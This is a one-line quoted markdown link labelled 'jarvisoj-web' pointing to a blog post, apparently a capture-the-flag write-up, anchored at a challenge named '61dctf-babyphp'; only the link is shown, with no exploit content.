> > [jarvisoj-web](https://skysec.top/2017/08/16/jarvisoj-web/#61dctf-babyphp)
